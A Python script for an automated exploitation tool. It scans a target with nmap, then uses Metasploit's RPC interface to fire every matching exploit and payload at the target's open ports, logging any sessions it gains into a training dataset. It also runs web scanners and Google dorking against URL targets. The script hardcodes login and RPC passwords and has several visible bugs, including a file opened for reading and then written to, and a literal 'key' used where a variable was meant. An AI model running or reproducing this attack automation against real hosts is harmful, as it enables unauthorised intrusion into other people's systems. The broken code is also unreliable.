#!/bin/env python
# -*- coding: utf-8 -*-
import os
import json
import codecs
import ipaddress
import pandas as pd
from docopt import docopt
from util import Utilty
from metasploit import Metasploit
from banner import *
from datetime import datetime
import socket
import getpass
from xray import XRay
from whatweb import Whatweb
from dataleakage import Googledork
from banetool import Bane
from wapititool import Wapiti

def is_valid_ip(rhost):
    try:
        ipaddress.ip_address(rhost)
        return True
    except ValueError:
        return False

def checkprotocol(addr):
    protocol = addr.split(':')
    if protocol[0] in ['http', 'https']:
        return True
    else:
        return False

def countnum(exploit_tree, target_tree, service_list, ttcount=0):
    for service in service_list:
        for exploit in service['exploit']:
            target_list = exploit_tree[exploit]['target_list']
            keys = service.keys()
            if 'prod_name' in keys:
                service_name = service['prod_name']
                for target in target_list:
                    payload_list = exploit_tree[exploit]['targets'][target]
                    if service_name != 'unknown':
                        available_actions = env.get_available_actions(payload_list, target_tree['os_type'])
                        ttcount += len(available_actions)
            else:
                for target in target_list:
                    payload_list = exploit_tree[exploit]['targets'][target]
                    available_actions = env.get_available_actions(payload_list, target_tree['os_type'])
                    ttcount += len(available_actions)
                    if service['port'] is None:
                        ttcount += ttcount*len(available_actions)
    return ttcount

def cal_finish_time(count):
    finish_time = count*5
    h = int(finish_time / 3600)
    m = int(finish_time / 60) % 60
    s = finish_time % 60
    return h, m, s

def session(exploit, target, selected_payload, rhost, port, lhost, ttcount, ttidx):
    message = ''
    session_list = []
    session_info = {}
    sesscsv = {}
    sess_list = []
    done = False
    uuid = ''
    job_id = 0

    job_id, uuid = env.client.execute_module('exploit', exploit, target, selected_payload, rhost, port, lhost)

    if uuid is not None:
        env.check_running_module(job_id, uuid)
        sessions = env.client.get_session_list()
        key_list = sessions.keys()
        keyvalue = list(key_list)
        if len(key_list) != 0:
            for key in key_list:
                session_id = int(key)
                session_type = sessions['key'][b'type'].decode('utf-8')
                session_port = str(sessions[key][b'session_port'])
                session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                session_payload = sessions[key][b'via_payload'].decode('utf-8')
                env.client.get_module_info('exploit', session_exploit)
                status = True
                if status:
                    done = True
                    message = 'bingo!! '
                    show_bingo()

                    session_info.update({'type':session_type})
                    session_info.update({'port':session_port})
                    session_info.update({'exploit':session_exploit[8:]})
                    session_info.update({'target':target})
                    session_info.update({'payload':session_payload[8:]})
                    session_list.append(session_info)

                    saved_file = os.path.join(env.data_path, 'target_info_' + rhost + '.json')
                    fin = codecs.open(saved_file, 'r', 'utf-8')
                    target_tree = json.loads(fin.read().replace('\0', ''))
                    fin.close()
                    target_tree['session_list'].append(session_info)
                    fout = codecs.open(saved_file, 'w', 'utf-8')
                    json.dump(target_tree, fout, indent=4)
                    fout.close()  
                    
                    sesscsv.update({'exploit':session_exploit[8:]})
                    sesscsv.update({'target':target})
                    sesscsv.update({'payload':session_payload[8:]})

                    fin = codecs.open(os.path.join(env.data_path, 'sesslist.txt'), 'r', 'utf-8')
                    for sess in fin:
                        sess = sess.replace("'", '"')
                        sesslist = json.loads(sess)
                        sess_list.append(sesslist)
                    fin.close()
                    fout = codecs.open(os.path.join(env.data_path, 'sesslist.txt'), 'a', 'utf-8')
                    if sesscsv not in sess_list:
                        fout.write(str(sesscsv) + '\n')
                    fout.close()
                else:
                    message = 'misfire '
                env.client.stop_session(session_id)
                break
        else:
            message = 'failure '
    else:
        done = True
        message = 'time out'
    util.print_message('ok', '{0}/{1} {2} {3} ({4}:{5}) '
                                '{6} | {7} | {8} '.format(  ttidx,
                                                            ttcount,
                                                            message,
                                                            rhost,
                                                            port,
                                                            lhost,
                                                            target,
                                                            exploit,
                                                            selected_payload))
    if len(keyvalue) != 0:
        env.client.stop_session(keyvalue[0])
    return done, session_list

def runvuln(module_list, exploit_tree, target_tree, com_payload_list, rhost, lhost, ttcount):
    fin = codecs.open(os.path.join(env.data_path, 'count.txt'), 'r', 'utf-8')
    ttidx = int(fin.read())
    fin.close()
    for vuln in module_list:
        for exploit in vuln['exploit']:
            target_list = exploit_tree[exploit]['target_list']
            for target in target_list:
                payload_list = exploit_tree[exploit]['targets'][target]
                available_actions = env.get_available_actions(payload_list, target_tree['os_type'])
                for action in available_actions:
                    selected_payload = com_payload_list[action]
                    if vuln['port'] is None:
                        for port in target_tree['opened_port_list']:
                            done, sess_info = session(exploit, target, selected_payload, rhost, port, lhost, ttcount, ttidx)
                    else:
                        done, sess_info = session(exploit, target, selected_payload, rhost, vuln['port'], lhost, ttcount, ttidx)
                    h,m,s = cal_finish_time(ttcount-ttidx)
                    print('finish in arround {0}h{1}m{2}s'.format(h,m,s))
                    ttidx += 1
                    if done is True:
                        break
    fout = codecs.open(os.path.join(env.data_path, 'count.txt'), 'r, utf-8')
    fout.write(str(ttidx))
    fout.close()

com_port_list = []
com_exploit_list = []
com_payload_list = []
com_indicate_flag = False

if __name__ == '__main__':
    show_banner()
    id = input("ID: ")
    password = getpass.getpass()

    if id.strip() != 'isystem' or password.strip() != 'PassW0rd':
        print('Invalid access')
        exit(1)

    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    st.connect(('10.255.255.255',1))
    server_host = st.getsockname()[0]

    print("load msgrpc ServerHost={0} ServerPort=55553 User=test Pass=test1234".format(server_host))
    # os.system("gnome-terminal --title=isystem --hide-menubar -- /bin/sh -c 'sudo msfdb start; sudo msfconsole -x 'load msgrpc ServerHost={0} ServerPort=55553 User=test Pass=test1234''".format(server_host))

    util = Utilty()
    now = datetime.now()
    date = now.strftime("%d%m%Y%H%Y%S")
    rhost = input("Target: ")
    rhost = rhost.strip()
    if checkprotocol(rhost): 
        print("W: Web Platform\nP: Programming / Configuration\nL: Logical Vulnerabilities\nD: Data Leakage\nall")
        funsel = input("function select: ")
        funsel = funsel.strip().lower()

        if funsel == "w":
            Whatweb(rhost)
            Bane(rhost)
            Wapiti(rhost)
        elif funsel == "p":
            XRay(rhost)
        elif funsel == "l":
            print('l')
        elif funsel == "d":
            Googledork(rhost)
        elif funsel == "all":
            Whatweb(rhost)
            XRay(rhost)
            Googledork(rhost)
        else:
            print('Invalid input')
            exit(1)
    else:
        lhost = input("lhost IP: ")
        mode = input("Mode(learn/run): ")
        if is_valid_ip(rhost) is False:
            util.print_message('fail' , 'Invalid IP address: {}'.format(rhost))
            exit(1)
        if is_valid_ip(lhost) is False:
            util.print_message('fail' , 'Invalid IP address: {}'.format(lhost))
            exit(1)
        if mode not in ['learn', 'run']:
            util.print_message('fail', 'Invalid mode: {}'.format(mode))
            exit(1)

        env = Metasploit(rhost, lhost)
        if rhost in env.prohibited_list:
            util.print_message('fail' , 'Target IP={} is prohibited.\n'
                                    '    Please check "config.ini"'.format(rhost))
            exit(1)    
        nmap_result = os.getcwd() + '/nmap_result_' + env.rhost + '.xml'
        nmap_command = env.nmap_command + ' ' + nmap_result + ' ' + env.rhost + '\n'

        com_port_list, proto_list, info_list = env.get_port_list(env.rhost, nmap_command, env.nmap_timeout, nmap_result)
        com_exploit_list = env.get_exploit_list()
        com_payload_list = env.get_payload_list()
        com_payload_list.append('no payload')

        exploit_tree = env.get_exploit_tree()
        target_tree = env.get_target_info(rhost, proto_list, info_list)    

        service_list = target_tree['service_list']
        port_list = target_tree['opened_port_list']
        vuln_list = target_tree['vulns']
        sess_list = []

        if len(service_list) == 0:
            util.print_message('warn', 'No open service.')
            util.print_message('warn', 'Shutdown Exploit Expert...')
            exit(1)
        elif mode == 'run':
            fin = codecs.open(os.path.join(env.data_path, 'sesslist.txt'), 'r', 'utf-8')
            for sess in fin:
                sess = sess.replace("'", '"')
                sesslist = json.loads(sess)
                sess_list.append(sesslist)
            fin.close()

            for sess in sess_list:
                for service in service_list:
                    if sess['prod_name'] == service['prod_name']:
                        env.moderun(sess['exploit'], sess['target'], sess['payload'], service)
            exit(1)
        else:
            ttcount = countnum(exploit_tree, target_tree, service_list)
            h,m,s = cal_finish_time(ttcount)
            print('full mode finish in arround {0}h{1}m{2}s'.format(h,m,s))

            selected_payload = ''
            ttcount = countnum(exploit_tree, target_tree, vuln_list)
            h,m,s = cal_finish_time(ttcount)
            print('vuln mode finish in arround {0}h{1}m{2}s'.format(h,m,s))

            learnmode = input('learn mode(full/custom/vuln/vulncustom): ')
            if learnmode == 'full':
                for idx,service in enumerate(service_list):
                    sess_info = env.run(exploit_tree, target_tree, idx, ttcount)
            elif learnmode == 'custom':
                new_list = []
                print("pick the service yoru want to learn:")
                for idx,service in enumerate(service_list):
                    ttcount = countnum(exploit_tree, target_tree, [service])
                    h,m,s = cal_finish_time(ttcount)
                    print(idx+1, service['prod_name'], 'finish in arround {0}h{1}m{2}s'.format(h,m,s))
                cus_str = input('select the number: ')
                cus_list = cus_str.split(",")
                for cus in cus_list:
                    new_list.append(service_list[int(cus)-1])
                ttcount = countnum(exploit_tree, target_tree, new_list)
                for cus in cus_list:
                    sess_info = env.run(exploit_tree, target_tree, int(cus)-1, ttcount)
            elif learnmode == 'vuln':
                runvuln(vuln_list, exploit_tree, target_tree, com_payload_list, rhost, lhost, ttcount)
            elif learnmode == 'vulncustom':
                new_list = []
                print("pick the service yoru want to learn:")
                for idx,vuln in enumerate(vuln_list):
                    ttcount = countnum(exploit_tree, target_tree, [vuln])
                    h,m,s = cal_finish_time(ttcount)
                    print(idx+1, vuln['serach'], 'finish in arround {0}h{1}m{2}s'.format(h,m,s))
                cus_str = input('select the number: ')
                cus_list = cus_str.split(",")
                for cus in cus_list:
                    new_list.append(vuln_list[int(cus)-1])
                ttcount = countnum(exploit_tree, target_tree, new_list)
                runvuln(vuln_list, exploit_tree, target_tree, com_payload_list, rhost, lhost, ttcount)
            else:
                print('wrong input')
                exit(1)

        saved_file = os.path.join(env.data_path, 'target_info_' + rhost + '.json')
        fin = codecs.open(saved_file, 'r', 'utf-8')
        target_tree = json.loads(fin.read().replace('\0', ''))
        fin.close()

        target_tree.update({'session_reverse':len(target_tree['session_list'])})
        if len(target_tree['session_list']) == 0:
            target_tree.update({'exploit_sucess':False})
        else:
            target_tree.update({'exploit_sucess':True})
            
        fout = codecs.open(saved_file, 'w', 'utf-8')
        json.dump(target_tree, fout, indent=4)
        fout.close()  

        fout = codecs.open(os.path.join(env.data_path, 'count.txt'), 'r, utf-8')
        fout.write(str(1))
        fout.close()
    
        del target_tree['rhost']
        for service in target_tree['service_list']:
            del service['port']
        target_tree_csv = pd.DataFrame([target_tree])
        target_tree_csv.to_csv(os.path.join(env.data_path, 'target_dataset.csv'), mode='a', header=False, index=False)
        util.print_message('ok', 'Saved target_dataset.csv')

        newpath = env.data_path+"/olddata"
        if os.path.isdir(newpath) is False:
            os.mkdir(newpath)

        os.system("mv " + os.path.join(env.data_path, 'target_info_' + rhost + '.json') + " " +newpath)
        os.system("mv " + os.path.join(newpath, 'target_info_' + rhost + '.json') + " " +os.path.join(newpath, 'target_info_'+rhost+date+'.json'))
